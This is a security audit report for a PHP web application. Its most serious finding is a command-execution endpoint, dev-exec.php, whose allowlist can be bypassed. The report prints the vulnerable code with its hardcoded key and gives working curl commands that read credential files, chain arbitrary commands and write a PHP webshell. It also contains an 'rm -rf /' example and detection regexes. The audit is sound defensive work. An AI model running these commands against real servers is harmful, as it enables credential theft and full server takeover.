# Other Findings — S116

**Date:** 2026-05-08
**Scope:** eval/exec/system, path traversal, insecure cookies, open redirects, mass assignment, misc.

## 1. CRITICAL — `dev-exec.php` Command Whitelist Bypass

**File:** `dev-exec.php:1-22` (full file)

```php
<?php
// САМО ЗА РАЗРАБОТКА — само от localhost или с ключ
$key = $_SERVER['HTTP_X_EXEC_KEY'] ?? '';
if ($key !== 'RMS_DEV_2026_CLAUDE') {
    http_response_code(403);
    die('Forbidden');
}
$cmd = $_POST['cmd'] ?? '';
if (!$cmd) die('No command');
// Само безопасни команди
$allowed = ['grep','ls','cat','tail','head','find','php','mysql','systemctl status','git'];
$safe = false;
foreach ($allowed as $a) {
    if (str_starts_with(trim($cmd), $a)) { $safe = true; break; }
}
if (!$safe) { http_response_code(400); die('Command not allowed'); }
$output = shell_exec($cmd . ' 2>&1');
header('Content-Type: text/plain');
echo $output;
```

### Vulnerability Chain

1. **Hardcoded auth key** in repo (`RMS_DEV_2026_CLAUDE`) — anyone with repo access has the key.
2. **`str_starts_with` is bypassable** — only checks the leading prefix, not the full command. So `git ; rm -rf /` passes (starts with `git`), AND `; rm -rf /` is then executed via `shell_exec`.
3. **No `escapeshellcmd` / `escapeshellarg`** — command is passed verbatim to shell.

### Reproduction (CRITICAL — full RCE)

```bash
# Read API keys
curl -X POST "https://app.runmystore.ai/dev-exec.php" \
  -H "X-EXEC-KEY: RMS_DEV_2026_CLAUDE" \
  --data-urlencode "cmd=cat /etc/runmystore/api.env"

# Read DB credentials (works because cat is whitelisted)
curl -X POST "https://app.runmystore.ai/dev-exec.php" \
  -H "X-EXEC-KEY: RMS_DEV_2026_CLAUDE" \
  --data-urlencode "cmd=cat /etc/runmystore/db.env"

# Arbitrary command via prefix bypass:
curl -X POST "https://app.runmystore.ai/dev-exec.php" \
  -H "X-EXEC-KEY: RMS_DEV_2026_CLAUDE" \
  --data-urlencode "cmd=git --version; whoami; id; uname -a"
# → executes git, then whoami, then id, then uname

# Write a webshell:
curl -X POST "https://app.runmystore.ai/dev-exec.php" \
  -H "X-EXEC-KEY: RMS_DEV_2026_CLAUDE" \
  --data-urlencode "cmd=cat /tmp/x.php; echo '<?php system(\$_GET[c]);?>' > /var/www/runmystore/x.php"
```

### Severity: **CRITICAL**

Full server compromise possible. **Delete or web-deny `dev-exec.php` immediately.**

## 2. MEDIUM — `sim_print.php:35` exec with escapeshellarg

```php
exec("python3 /var/www/runmystore/sim_render.py "
    . escapeshellarg($bin_path) . " "
    . escapeshellarg($png_base) . " 2>&1", $out, $rc);
```

- Uses `escapeshellarg` ✓ (proper)
- But: `$bin_path` and `$png_base` provenance? If from `$_POST`/`$_GET`, escapeshellarg neutralizes shell metacharacters but does NOT prevent path traversal (`../../../etc/passwd`).
- Verify both vars come from server-controlled sources only.

**Recommendation:** Audit `sim_print.php` callers. If `$bin_path`/`$png_base` derived from user input, validate as basename or against a whitelist.

## 3. LOW — Path Traversal scan

Pattern scanned: `(file_get_contents|include|require|fopen|readfile)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)\[`

**Result:** ✅ NO direct hits.

All file operations use server-controlled paths (e.g., `__DIR__ . '/...'`, hardcoded uploads dir).

## 4. LOW — Open Redirect scan

Pattern scanned: `header\s*\(\s*['\"]Location:` with `$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`/`$_SERVER`.

**Result:** ✅ NO open-redirect vulnerabilities found.

All `header('Location: ...')` calls use **hardcoded paths** (login.php, chat.php, sale.php, life-board.php, etc.). Open redirect attacks (e.g., `?next=https://evil.com`) are not possible.

## 5. LOW — Mass Assignment

Pattern: `setAttributes($_POST)` or `extract($_POST/_GET/_REQUEST)`.

**Result:** ✅ NO findings.

Project does not use ORM frameworks like Laravel/Symfony with mass-assignment patterns. All DB inserts/updates use explicit column lists in prepared statements.

## 6. LOW — `$_REQUEST` usage

`$_REQUEST` mixes GET, POST, COOKIE — leads to confusion and potential bypass when one source is sanitized differently.

**Result:** ✅ NO `$_REQUEST` usage (clean architectural choice).

## 7. LOW — Cookies (insecure flags)

Only one `setcookie()` call:
- `logout.php:7`: `setcookie(session_name(), '', time() - 3600, '/');`
  This is **clearing** the session cookie on logout. Setting to past timestamp is correct. No security flag issue here (Secure/HttpOnly omitted because the cookie is already being deleted).

But: this confirms there's no `setcookie()` for any other purpose. All custom session data goes through `$_SESSION[]` (server-side).

## 8. MEDIUM — Hardcoded Test Endpoints (web-accessible)

Files that look like dev/debug:
- `dev-exec.php` — see §1, CRITICAL
- `voice-tier2-test.php` — voice testing endpoint
- `ua-debug.php` — user-agent debug
- `migrate.php` — schema migration (potentially destructive)
- `weather-cache.php` — cache utility
- `cron-insights.php`, `cron-monthly.php` — cron scripts

Recommendation: Add to `.htaccess`:
```apache
<FilesMatch "^(dev-exec|voice-tier2-test|ua-debug|migrate|cron-insights|cron-monthly)\.php$">
    Order Deny,Allow
    Deny from all
    Allow from 127.0.0.1
</FilesMatch>
```

## 9. MEDIUM — `$_FILES['file']['type']` trust

`delivery.php:135` uses `$_FILES['file']['type'][$i]` (client-controlled) as the MIME for OCRRouter. Already covered in `06_uploads_audit.md` §1.

## Severity Summary

| Item | Severity |
|------|----------|
| 1. dev-exec.php RCE | **CRITICAL** |
| 2. sim_print.php exec | MEDIUM |
| 3. Path traversal | none |
| 4. Open redirect | none |
| 5. Mass assignment | none |
| 6. $_REQUEST | none |
| 7. Insecure cookies | none |
| 8. Test endpoints exposed | MEDIUM |
| 9. $_FILES['type'] trust | covered in 06 |
